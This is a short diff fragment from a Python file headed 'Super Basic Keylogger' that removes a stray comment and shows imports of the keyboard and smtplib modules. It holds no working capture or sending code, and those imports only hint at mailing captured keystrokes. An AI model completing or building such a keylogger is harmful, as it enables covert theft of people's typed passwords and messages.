@@ -1,5 +1,4 @@
 #Super Basic Keylogger
-#ths is random:wq
 
 import keyboard 
 import smtplib 
